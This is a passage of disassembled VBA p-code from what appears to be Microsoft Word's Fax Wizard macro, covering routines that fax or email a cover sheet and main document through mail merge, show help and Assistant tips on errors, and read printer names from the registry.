' 	St StatusBar 
' Line #1980:
' 	Ld objTmpMM 
' 	ArgsMemCall Execute 0x0000 
' Line #1981:
' Line #1982:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld fMSFax 
' 	And 
' 	ElseIfBlock 
' Line #1983:
' 	Ld strFAXING_CS_TO 
' 	LitStr 0x0001 " "
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd rgstrFaxNums 0x0001 
' 	Concat 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	St StatusBar 
' Line #1984:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SendMailAttach 
' Line #1985:
' 	LitDI2 0x0000 
' 	ArgsLd rgstrFaxNums 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemCall SendFax 0x0001 
' Line #1986:
' 	QuoteRem 0x0010 0x0039 "MsgBox "Faxing to  " & rgstrFaxNames(0) & rgstrFaxNums(0)"
' Line #1987:
' 	ElseBlock 
' 	QuoteRem 0x000D 0x000A "non MS fax"
' Line #1988:
' 	Ld strFAXING_CS_RECIPIENT 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	St StatusBar 
' Line #1989:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #1990:
' 	EndIfBlock 
' Line #1991:
' 	EndIfBlock 
' Line #1992:
' Line #1993:
' 	Ld fMainDocPresent 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo LResetPrinter 
' 	EndIf 
' 	QuoteRem 0x0033 0x001A "if no main doc. then deesh"
' Line #1994:
' Line #1995:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld fMSFax 
' 	Paren 
' 	Not 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld objMainDoc 
' 	ArgsMemCall PrintOut 0x0000 
' 	EndIf 
' Line #1996:
' Line #1997:
' 	QuoteRem 0x0004 0x0012 "send the main doc."
' Line #1998:
' 	Ld fMSFax 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SendMailAttach 
' 	EndIf 
' Line #1999:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #2000:
' 	Ld fMSFax 
' 	IfBlock 
' Line #2001:
' 	Ld strFAXING_DOC_TO 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld i 
' 	ArgsLd rgstrFaxNums 0x0001 
' 	Concat 
' 	St StatusBar 
' Line #2002:
' 	Ld i 
' 	ArgsLd rgstrFaxNums 0x0001 
' 	Ld objMainDoc 
' 	ArgsMemCall SendFax 0x0001 
' Line #2003:
' 	QuoteRem 0x000C 0x0039 "MsgBox "Faxing to  " & rgstrFaxNames(i) & rgstrFaxNums(i)"
' Line #2004:
' 	ElseBlock 
' Line #2005:
' 	Ld strFAXING_DOC_RECIPIENT 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Coerce (Str) 
' 	Concat 
' 	LitStr 0x0003 "..."
' 	Concat 
' 	St StatusBar 
' Line #2006:
' 	Ld objMainDoc 
' 	ArgsMemCall PrintOut 0x0000 
' Line #2007:
' 	EndIfBlock 
' Line #2008:
' Line #2009:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #2010:
' Line #2011:
' 	Label LResetPrinter 
' Line #2012:
' 	QuoteRem 0x0000 0x001C "reset printer for non MS fax"
' Line #2013:
' 	Ld fMSFax 
' 	IfBlock 
' Line #2014:
' 	Ld fSendMailAttach 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SendMailAttach 
' Line #2015:
' 	ElseBlock 
' Line #2016:
' 	Ld strActivePrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' Line #2017:
' 	EndIfBlock 
' Line #2018:
' 	Ld strMSG_FAX_SUCCESS 
' 	LitVarSpecial (True)
' 	ArgsCall DisplayPostWizTip 0x0002 
' Line #2019:
' 	QuoteRem 0x0004 0x001D "DeleteCmdBar strCMD_BAR_TITLE"
' Line #2020:
' 	ExitSub 
' Line #2021:
' Line #2022:
' 	Label FatalError 
' Line #2023:
' 	Ld Err 
' 	MemLd Number 
' 	St i 
' Line #2024:
' 	Ld i 
' 	If 
' 	BoSImplicit 
' 	Ld strErrorMsg 
' 	Ld vbCr 
' 	Concat 
' 	Ld Err 
' 	MemLd Description 
' 	Concat 
' 	St strErrorMsg 
' 	EndIf 
' Line #2025:
' 	QuoteRem 0x0004 0x0022 "if Fax not installed error message"
' Line #2026:
' 	LineCont 0x0004 05 00 08 00
' 	Ld i 
' 	Ld iERR_FAX_NOT_INSTALLED 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld strErrorMsg 
' 	Ld vbCr 
' 	Concat 
' 	Ld strHLP_FAX_INSTALL 
' 	Concat 
' 	St strErrorMsg 
' 	EndIf 
' Line #2027:
' 	Ld strErrorMsg 
' 	ArgsCall DisplayTip 0x0001 
' Line #2028:
' 	QuoteRem 0x0000 0x001C "reset printer for non MS fax"
' Line #2029:
' 	Ld fMSFax 
' 	IfBlock 
' Line #2030:
' 	Ld fSendMailAttach 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SendMailAttach 
' Line #2031:
' 	ElseBlock 
' Line #2032:
' 	Ld strActivePrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' Line #2033:
' 	EndIfBlock 
' Line #2034:
' Line #2035:
' 	Ld i 
' 	Ld iERR_FAX_NOT_INSTALLED 
' 	Eq 
' 	IfBlock 
' Line #2036:
' 	Ld strWIN_HELP_FILE 
' 	Ld lCNTXT_FAX_INSTALL 
' 	ArgsCall DisplayHelp 0x0002 
' Line #2037:
' 	Ld i 
' 	Ld iERR_FAX_NOT_SENT 
' 	Eq 
' 	Ld fMSFax 
' 	And 
' 	ElseIfBlock 
' Line #2038:
' 	Ld strFAX_HELP_FILE 
' 	Ld lCNTXT_FAX_SEND 
' 	ArgsCall DisplayHelp 0x0002 
' Line #2039:
' 	EndIfBlock 
' Line #2040:
' 	EndSub 
' Line #2041:
' 	QuoteRem 0x0000 0x004B "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,"
' Line #2042:
' 	QuoteRem 0x0000 0x0026 "Activedocument is new cover sheet doc."
' Line #2043:
' 	FuncDefn (Private Sub FaxFormLtr())
' Line #2044:
' Line #2045:
' 	Dim 
' 	VarDefn fMSFax (As Boolean)
' Line #2046:
' 	Dim 
' 	VarDefn fCovSht (As Boolean)
' Line #2047:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #2048:
' 	Dim 
' 	VarDefn strDocName (As String)
' Line #2049:
' 	Dim 
' 	VarDefn iDestination (As Long)
' Line #2050:
' 	Dim 
' 	VarDefn objVars (As Variables)
' Line #2051:
' 	Dim 
' 	VarDefn fMainDocPresent (As Integer)
' Line #2052:
' 	Dim 
' 	VarDefn strErrorMsg (As String)
' Line #2053:
' 	Dim 
' 	VarDefn strFaxPrinter (As String)
' 	VarDefn strActivePrinter (As String)
' Line #2054:
' 	Dim 
' 	VarDefn objTmpMM (As MailMerge)
' 	VarDefn strFaxFld (As String)
' Line #2055:
' Line #2056:
' 	OnError FatalError 
' Line #2057:
' Line #2058:
' 	Ld strERR_SEND_FAX 
' 	St strErrorMsg 
' Line #2059:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	Set objVars 
' Line #2060:
' Line #2061:
' 	LitStr 0x0013 "Cover Sheet Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fCovSht 
' Line #2062:
' 	LitStr 0x000E "MS Fax Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fMSFax 
' Line #2063:
' 	LitStr 0x0010 "Main Doc Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fMainDocPresent 
' Line #2064:
' 	LitStr 0x000E "Fax Field Name"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strFaxFld 
' Line #2065:
' Line #2066:
' 	Ld fMainDocPresent 
' 	IfBlock 
' Line #2067:
' 	QuoteRem 0x0008 0x001E "obtain handle to main document"
' Line #2068:
' 	LitStr 0x0012 "Main Document Name"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strDocName 
' Line #2069:
' 	Ld objMainDoc 
' 	Ld strDocName 
' 	ArgsLd FInvalidMainDoc 0x0002 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #2070:
' 	QuoteRem 0x0008 0x0032 "Set objMainDoc = Application.Documents(strDocName)"
' Line #2071:
' 	EndIfBlock 
' Line #2072:
' Line #2073:
' 	Ld fMSFax 
' 	IfBlock 
' Line #2074:
' 	LitStr 0x000D "Through Email"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	IfBlock 
' Line #2075:
' 	Ld wdSendToEmail 
' 	St iDestination 
' Line #2076:
' 	ElseBlock 
' Line #2077:
' 	Ld wdSendToFax 
' 	St iDestination 
' Line #2078:
' 	EndIfBlock 
' Line #2079:
' 	ElseBlock 
' Line #2080:
' 	Ld wdSendToPrinter 
' 	St iDestination 
' Line #2081:
' 	QuoteRem 0x0008 0x003E "if nonMSFax, then set the Fax driver to be the current printer"
' Line #2082:
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	St strActivePrinter 
' Line #2083:
' 	LitStr 0x000B "Fax Printer"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strFaxPrinter 
' Line #2084:
' 	Ld strFaxPrinter 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	St strFaxPrinter 
' 	EndIf 
' Line #2085:
' 	Ld strFaxPrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' Line #2086:
' 	EndIfBlock 
' Line #2087:
' Line #2088:
' 	QuoteRem 0x0004 0x0019 "send the coversheet first"
' Line #2089:
' 	Ld fCovSht 
' 	Paren 
' 	IfBlock 
' Line #2090:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	Set objTmpMM 
' Line #2091:
' 	Ld iDestination 
' 	Ld objTmpMM 
' 	MemSt Destination 
' 	QuoteRem 0x002C 0x002B "MsgBox "MailMerging activdoc (coversheet) ""
' Line #2092:
' 	Ld strFaxFld 
' 	Ld objTmpMM 
' 	MemSt MailAddressFieldName 
' Line #2093:
' 	LitVarSpecial (True)
' 	Ld objTmpMM 
' 	MemSt MailAsAttachment 
' Line #2094:
' 	Ld strFAXING_CS_RECIPIENTS 
' 	St StatusBar 
' Line #2095:
' 	Ld objTmpMM 
' 	ArgsMemCall Execute 0x0000 
' Line #2096:
' 	EndIfBlock 
' Line #2097:
' Line #2098:
' 	Ld fMainDocPresent 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo LResetPrinter 
' 	EndIf 
' Line #2099:
' Line #2100:
' 	QuoteRem 0x0004 0x0015 "fax the main document"
' Line #2101:
' 	SetStmt 
' 	Ld objMainDoc 
' 	MemLd MailMerge 
' 	Set objTmpMM 
' Line #2102:
' 	Ld iDestination 
' 	Ld objTmpMM 
' 	MemSt Destination 
' Line #2103:
' 	Ld strFaxFld 
' 	Ld objTmpMM 
' 	MemSt MailAddressFieldName 
' Line #2104:
' 	LitVarSpecial (True)
' 	Ld objTmpMM 
' 	MemSt MailAsAttachment 
' Line #2105:
' 	Ld strFAXING_DOC_RECIPIENTS 
' 	St StatusBar 
' Line #2106:
' 	Ld objTmpMM 
' 	ArgsMemCall Execute 0x0000 
' Line #2107:
' 	QuoteRem 0x0004 0x001E "MsgBox "MailMerging main doc.""
' Line #2108:
' Line #2109:
' 	Label LResetPrinter 
' Line #2110:
' 	QuoteRem 0x0000 0x001C "reset printer for non MS fax"
' Line #2111:
' 	Ld ActiveDocument 
' 	MemLd Fields 
' 	ArgsMemCall Update 0x0000 
' Line #2112:
' 	Ld fMSFax 
' 	Paren 
' 	Not 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld strActivePrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' 	EndIf 
' Line #2113:
' 	Ld strMSG_FAX_SUCCESS 
' 	LitVarSpecial (True)
' 	ArgsCall DisplayPostWizTip 0x0002 
' Line #2114:
' 	QuoteRem 0x0004 0x001D "DeleteCmdBar strCMD_BAR_TITLE"
' Line #2115:
' 	ExitSub 
' Line #2116:
' Line #2117:
' 	Label FatalError 
' Line #2118:
' 	Ld Err 
' 	MemLd Number 
' 	St i 
' Line #2119:
' 	Ld i 
' 	If 
' 	BoSImplicit 
' 	Ld strErrorMsg 
' 	Ld vbCr 
' 	Concat 
' 	Ld Err 
' 	MemLd Description 
' 	Concat 
' 	St strErrorMsg 
' 	EndIf 
' Line #2120:
' 	QuoteRem 0x0004 0x0022 "if Fax not installed error message"
' Line #2121:
' 	LineCont 0x0004 05 00 08 00
' 	Ld i 
' 	Ld iERR_FAX_NOT_INSTALLED 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld strErrorMsg 
' 	Ld vbCr 
' 	Concat 
' 	Ld strHLP_FAX_INSTALL 
' 	Concat 
' 	St strErrorMsg 
' 	EndIf 
' Line #2122:
' Line #2123:
' 	Ld strErrorMsg 
' 	ArgsCall DisplayTip 0x0001 
' Line #2124:
' Line #2125:
' 	QuoteRem 0x0000 0x001C "reset printer for non MS fax"
' Line #2126:
' 	Ld fMSFax 
' 	Paren 
' 	Not 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld strActivePrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' 	EndIf 
' Line #2127:
' Line #2128:
' 	Ld i 
' 	Ld iERR_FAX_NOT_INSTALLED 
' 	Eq 
' 	IfBlock 
' Line #2129:
' 	Ld strWIN_HELP_FILE 
' 	Ld lCNTXT_FAX_INSTALL 
' 	ArgsCall DisplayHelp 0x0002 
' Line #2130:
' 	Ld i 
' 	Ld iERR_FAX_NOT_SENT 
' 	Eq 
' 	Ld fMSFax 
' 	And 
' 	ElseIfBlock 
' Line #2131:
' 	Ld strFAX_HELP_FILE 
' 	Ld lCNTXT_FAX_SEND 
' 	ArgsCall DisplayHelp 0x0002 
' Line #2132:
' 	EndIfBlock 
' Line #2133:
' 	EndSub 
' Line #2134:
' Line #2135:
' 	QuoteRem 0x0000 0x004D "To display help using help files. Assuming that the help files are present in"
' Line #2136:
' 	QuoteRem 0x0000 0x0015 "the windows directory"
' Line #2137:
' 	FuncDefn (Private Sub DisplayHelp(strFile As String, ByVal lContext As Long))
' Line #2138:
' 	Dim 
' 	VarDefn iSize (As Integer)
' Line #2139:
' 	Dim 
' 	VarDefn strTmpBuffer (As String)
' Line #2140:
' 	Dim 
' 	VarDefn j (As Integer)
' 	VarDefn i (As Integer)
' Line #2141:
' 	Dim 
' 	VarDefn strWinDir (As String)
' 	VarDefn strWndName (As String)
' Line #2142:
' 	Dim 
' 	VarDefn hOpusWin (As Long)
' 	VarDefn lResult (As Long)
' Line #2143:
' 	Dim 
' 	VarDefn strMacroName (As String)
' Line #2144:
' Line #2145:
' 	QuoteRem 0x0004 0x0015 "Get windows directory"
' Line #2146:
' 	LitDI2 0x0200 
' 	St i 
' Line #2147:
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St strTmpBuffer 
' Line #2148:
' 	LitDI2 0x0000 
' 	St j 
' Line #2149:
' 	LitStr 0x0000 ""
' 	St strWinDir 
' Line #2150:
' 	Ld strTmpBuffer 
' 	Ld i 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St j 
' Line #2151:
' Line #2152:
' 	Ld j 
' 	IfBlock 
' Line #2153:
' 	Ld j 
' 	Ld i 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	St j 
' 	EndIf 
' Line #2154:
' Line #2155:
' 	Ld strTmpBuffer 
' 	Ld j 
' 	ArgsLd LBound$ 0x0002 
' 	St strWinDir 
' Line #2156:
' 	LineCont 0x0004 0A 00 0C 00
' 	Ld strWinDir 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	Ld strPathSeparator 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld strWinDir 
' 	Ld strPathSeparator 
' 	Concat 
' 	St strWinDir 
' 	EndIf 
' Line #2157:
' 	EndIfBlock 
' Line #2158:
' Line #2159:
' 	QuoteRem 0x0004 0x0012 "Find word's window"
' Line #2160:
' 	Ld strMS_WORD 
' 	St strWndName 
' Line #2161:
' 	LineCont 0x0004 07 00 08 00
' 	Ld ActiveWindow 
' 	MemLd WindowState 
' 	Ld wdWindowStateMaximize 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld strWndName 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	Concat 
' 	St strWndName 
' 	EndIf 
' Line #2162:
' 	LitStr 0x0007 "OpusApp"
' 	Ld strWndName 
' 	ArgsLd FindWindow 0x0002 
' 	St hOpusWin 
' Line #2163:
' 	Ld hOpusWin 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo LNotFindWindow 
' 	EndIf 
' Line #2164:
' Line #2165:
' 	QuoteRem 0x0004 0x000C "display help"
' Line #2166:
' 	LitStr 0x0003 "JH("
' 	Ld strQUOTE 
' 	Concat 
' 	Ld strQUOTE 
' 	Concat 
' 	LitStr 0x0003 " , "
' 	Concat 
' 	Ld lContext 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St strMacroName 
' Line #2167:
' 	Ld hOpusWin 
' 	Ld strWinDir 
' 	Ld strFile 
' 	Concat 
' 	Ld HELP_COMMAND 
' 	Ld strMacroName 
' 	ArgsLd WinHelp 0x0004 
' 	St lResult 
' Line #2168:
' Line #2169:
' 	Label LNotFindWindow 
' Line #2170:
' 	EndSub 
' Line #2171:
' 	QuoteRem 0x0000 0x0029 "displays a tip during post-wizard options"
' Line #2172:
' 	QuoteRem 0x0000 0x004D "assumes that Assistant is present since it is called from post-wizard balloon"
' Line #2173:
' 	FuncDefn (Private Sub DisplayTip(strTip As String))
' Line #2174:
' 	Dim 
' 	VarDefn objBlnTip (As Balloon)
' Line #2175:
' 	OnError FatalError 
' Line #2176:
' Line #2177:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set objBlnTip 
' Line #2178:
' Line #2179:
' 	StartWithExpr 
' 	Ld objBlnTip 
' 	With 
' Line #2180:
' 	Ld msoModeModal 
' 	MemStWith Mode 
' Line #2181:
' 	Ld strWizName 
' 	MemStWith Heading 
' Line #2182:
' 	Ld strTip 
' 	MemStWith Then 
' Line #2183:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #2184:
' 	EndWith 
' Line #2185:
' 	Ld objBlnTip 
' 	ArgsMemCall Show 0x0000 
' Line #2186:
' Line #2187:
' 	Ld Assistant 
' 	MemLd BalloonError 
' 	Ld msoBalloonErrorNone 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo FatalError 
' 	EndIf 
' Line #2188:
' Line #2189:
' 	ExitSub 
' Line #2190:
' Line #2191:
' 	Label FatalError 
' Line #2192:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #2193:
' 	QuoteRem 0x0004 0x0038 "MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName"
' Line #2194:
' 	EndSub 
' Line #2195:
' 	QuoteRem 0x0000 0x0029 "ROUTINES TO OBTAIN PRINTERS FROM REGISTRY"
' Line #2196:
' 	QuoteRem 0x0000 0x0048 "fills rgstrPrinterNames with the local and remote printer names obtained"
' Line #2197:
' 	QuoteRem 0x0000 0x003E "from the registry. iTotalNumPrinters has the number of printer"
' Line #2198:
' 	QuoteRem 0x0000 0x000F "names obtained."
' Line #2199:
' 	FuncDefn (Sub GetAllPrinters())
' Line #2200:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #2201:
' Line #2202:
' 	LitDI2 0x0000 
' 	St iTotalNumPrinters 
' Line #2203:
' Line #2204:
' 	ArgsCall GetLocalPrinters 0x0000 
' Line #2205:
' 	ArgsCall GetRemotePrinters 0x0000 
' Line #2206:
' Line #2207:
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #2208:
' 	OptionBase 
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim (Preserve) rgstrPrinterNames 0x0001 (As Variant)
' Line #2209:
' 	Ld rgstrPrinterNames 
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemSt List 
' Line #2210:
' 	LitDI2 0x0000 
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemSt ListIndex 
' Line #2211:
' 	EndIfBlock 
' Line #2212:
' 	QuoteRem 0x0004 0x0044 "if no printers, then the user can use cmdOtherPrinters to select one"
' Line #2213:
' 	QuoteRem 0x0004 0x0026 "if we failed to enumerate some printer"
' Line #2214:
' Line #2215:
' 	EndSub 
' Line #2216:
' 	FuncDefn (Sub GetRemotePrinters())
' Line #2217:
' 	Dim 
' 	VarDefn hr (As Long)
' Line #2218:
' 	Dim 
' 	VarDefn hSubKey (As Long)
' Line #2219:
' Line #2220:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld strREG_PROVIDERS 
' 	Ld hSubKey 
' 	ArgsLd RegOpenKey 0x0003 
' 	St hr 
' Line #2221:
' 	Ld hr 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #2222:
' Line #2223:
' 	Ld hSubKey 
' 	Paren 
' 	ArgsCall GetRemotePrinterNames 0x0001 
' Line #2224:
' Line #2225:
' 	Ld hSubKey 
' 	Paren 
' 	ArgsCall RegCloseKey 0x0001 
' Line #2226:
' Line #2227:
' 	EndSub 
' Line #2228:
' Line #2229:
' 	FuncDefn (Sub GetProviderPrinters(strProvider As String))
' Line #2230:
' 	Dim 
' 	VarDefn hr (As Long)
' Line #2231:
' 	Dim 
' 	VarDefn hKeyProviderServers (As Long)
' Line #2232:
' 	Dim 
' 	VarDefn lpPrinterServer (As String)
' 	VarDefn strPrinterServer (As String)
' Line #2233:
' 	Dim 
' 	VarDefn cbPrinterServer (As Long)
' Line #2234:
' 	Dim 
' 	VarDefn dwPrinterIndex (As Long)
' Line #2235:
' 	Dim 
' 	VarDefn lRet (As Long)
' 	VarDefn iLenPrinterServer (As Integer)
' Line #2236:
' Line #2237:
' 	LitDI2 0x0100 
' 	St cbPrinterServer 
' Line #2238:
' 	Ld cbPrinterServer 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpPrinterServer 
' Line #2239:
' 	LitDI2 0x0000 
' 	St dwPrinterIndex 
' Line #2240:
' Line #2241:
' Line #2242:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld strREG_PROVIDERS 
' 	Ld strProvider 
' 	Concat 
' 	LitStr 0x0008 "\Servers"
' 	Concat 
' 	Ld hKeyProviderServers 
' 	ArgsLd RegOpenKey 0x0003 
' 	St hr 
' Line #2243:
' Line #2244:
' 	Ld hr 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LEndGetProviderPrinters 
' 	EndIf 
' Line #2245:
' Line #2246:
' 	Ld ERROR_SUCCESS 
' 	St lRet 
' Line #2247:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Eq 
' 	Paren 
' 	While 
' Line #2248:
' 	Ld cbPrinterServer 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpPrinterServer 
' Line #2249:
' Line #2250:
' 	Ld hKeyProviderServers 
' 	Ld dwPrinterIndex 
' 	Ld lpPrinterServer 
' 	Ld cbPrinterServer 
' 	ArgsLd RegEnumKey 0x0004 
' 	St hr 
' Line #2251:
' Line #2252:
' 	Ld hr 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LCloseProviderServersKey 
' 	EndIf 
' Line #2253:
' Line #2254:
' 	Ld lpPrinterServer 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St iLenPrinterServer 
' Line #2255:
' 	Ld iLenPrinterServer 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0028 0x0007 "no name"
' Line #2256:
' 	Ld lpPrinterServer 
' 	Ld iLenPrinterServer 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St strPrinterServer 
' Line #2257:
' 	Ld strProvider 
' 	Ld strPrinterServer 
' 	ArgsCall GetPrinterNamesFromServer 0x0002 
' Line #2258:
' 	EndIfBlock 
' Line #2259:
' Line #2260:
' 	Ld dwPrinterIndex 
' 	LitDI2 0x0001 
' 	Add 
' 	St dwPrinterIndex 
' Line #2261:
' 	Wend 
' Line #2262:
' Line #2263:
' 	Label LCloseProviderServersKey 
' Line #2264:
' 	Ld hKeyProviderServers 
' 	Paren 
' 	ArgsCall RegCloseKey 0x0001 
' Line #2265:
' Line #2266:
' 	Label LEndGetProviderPrinters 
' Line #2267:
' 	EndSub 
' Line #2268:
' Line #2269:
' 	FuncDefn (Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String))
' Line #2270:
' 	Dim 
' 	VarDefn hr (As Long)
' Line #2271:
' 	Dim 
' 	VarDefn hKeyPrinterServers (As Long)
' Line #2272:
' 	Dim 
' 	VarDefn lpPrinterName (As String)
' 	VarDefn strPrinterName (As String)
' Line #2273:
' 	Dim 
' 	VarDefn strPrinter (As String)
' Line #2274:
' 	Dim 
' 	VarDefn cbPrinterName (As Long)
' Line #2275:
' 	Dim 
' 	VarDefn dwPrinterIndex (As Long)
' Line #2276:
' 	Dim 
' 	VarDefn lRet (As Long)
' 	VarDefn iLenPrinterName (As Integer)
' Line #2277:
' 	Dim 
' 	VarDefn strRegPrinterServers (As String)
' Line #2278:
' Line #2279:
' Line #2280:
' 	LitDI2 0x0100 
' 	St cbPrinterName 
' Line #2281:
' 	Ld cbPrinterName 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpPrinterName 
' Line #2282:
' 	LitDI2 0x0000 
' 	St dwPrinterIndex 
' Line #2283:
' Line #2284:
' 	OnError (Resume Next) 
' Line #2285:
' 	Ld strREG_PROVIDERS 
' 	Ld strProvider 
' 	Concat 
' 	LitStr 0x0009 "\Servers\"
' 	Concat 
' 	Ld strPrinterServer 
' 	Concat 
' 	LitStr 0x0009 "\Printers"
' 	Concat 
' 	St strRegPrinterServers 
' Line #2286:
' 	Ld HKEY_LOCAL_MACHINE 
' 	Ld strRegPrinterServers 
' 	Ld hKeyPrinterServers 
' 	ArgsLd RegOpenKey 0x0003 
' 	St hr 
' Line #2287:
' Line #2288:
' 	Ld hr 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LEndGetProviderPrinters 
' 	EndIf 
' Line #2289:
' Line #2290:
' 	Ld ERROR_SUCCESS 
' 	St lRet 
' Line #2291:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Eq 
' 	Paren 
' 	While 
' Line #2292:
' 	Ld cbPrinterName 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St lpPrinterName 
' Line #2293:
' Line #2294:
' 	Ld hKeyPrinterServers 
' 	Ld dwPrinterIndex 
' 	Ld lpPrinterName 
' 	Ld cbPrinterName 
' 	ArgsLd RegEnumKey 0x0004 
' 	St lRet 
' Line #2295:
' Line #2296:
' 	Ld lRet 
' 	Ld ERROR_SUCCESS 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo LClosePrinterServersKey 
' 	EndIf 
' Line #2297:
' Line #2298:
' 	Ld lpPrinterName 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	St iLenPrinterName 
' Line #2299:
' 	Ld iLenPrinterName 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0026 0x0007 "no name"
' Line #2300:
' 	Ld lpPrinterName 
' 	Ld iLenPrinterName 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	St strPrinter 
' Line #2301:
' 	LitStr 0x0000 ""
' 	St strPrinterName 
' Line #2302:
' 	LitStr 0x0000 ""
' 	LitStr 0x0013 "HKEY_LOCAL_MACHINE\"
' 	Ld strRegPrinterServers 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld strPrinter 
' 	Concat 
' 	LitStr 0x0004 "Name"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St strPrinterName 
' Line #2303:
' Line #2304:
' 	Ld strPrinterName 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #2305:
' 	LineCont 0x0004 09 00 14 00
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x000A 
' 	Mod 
